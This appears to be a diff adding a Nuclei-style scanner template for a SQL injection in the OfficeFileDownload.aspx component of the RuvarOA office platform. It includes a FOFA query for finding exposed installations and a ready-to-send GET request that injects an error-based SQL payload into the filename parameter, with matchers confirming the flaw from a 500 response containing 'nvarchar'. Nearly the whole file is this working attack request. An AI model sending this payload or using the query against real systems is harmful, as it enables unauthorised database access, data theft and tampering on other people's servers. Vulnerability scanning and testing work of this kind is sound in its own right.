@@ -1,0 +1,25 @@
+id: ruvaroa-officefiledownload-sqli
+
+info:
+  name: RuvarOA协同办公平台 OfficeFileDownload组件SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="txt_admin_key"
+    RuvarOA协同办公平台的OfficeFileDownload组件存在SQL注入漏洞，攻击者可通过构造恶意SQL语句在受影响的接口中执行未经授权的数据库操作，导致数据篡改、泄露或服务中断。
+  tags: RuvarOA协同办公平台
+
+http:
+- raw:
+  - |
+    GET /WorkFlow/OfficeFileDownload.aspx?filename=1%27%20and%20%28@@version%29%3E0-- HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'nvarchar'
